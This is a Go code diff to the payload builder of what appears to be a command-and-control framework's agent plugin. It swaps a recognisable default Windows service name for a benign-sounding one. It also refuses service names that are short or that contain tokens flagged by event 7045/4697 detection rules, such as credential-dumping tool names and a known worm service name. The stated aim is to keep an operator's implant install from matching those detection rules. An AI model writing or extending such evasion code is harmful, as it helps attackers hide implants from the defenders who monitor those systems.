@@ -260,9 +260,23 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		outputFormat = strings.ToLower(v)
 	}
 
-	svcName := "NaxService"
+	// Service-name hygiene: the 7045/4697 string-list rules flag short
+	// %systemroot% exe names and known worm service-name families. Enforce
+	// plausible-length, benign-name defaults at build time so an operator's
+	// default install can't produce a signature.
+	svcName := "WinSvcAssist"
 	if v, ok := agentCfg["svc_name"].(string); ok && v != "" {
 		svcName = v
+	}
+	if outputFormat == "svc" {
+		if len(svcName) < 9 {
+			return nil, "", fmt.Errorf("nonameax: svc_name %q too short (<9 chars) - 7045 ImagePath rules flag short systemroot exe names", svcName)
+		}
+		for _, bad := range []string{"nax", "adaptix", "mssecsvc", "wceservice", "pwdump", "gsecdump", "cachedump", "comspec"} {
+			if strings.Contains(strings.ToLower(svcName), bad) {
+				return nil, "", fmt.Errorf("nonameax: svc_name %q contains flagged token %q (7045 service-name rule list)", svcName, bad)
+			}
+		}
 	}
 
 	dllExport := "Runner"
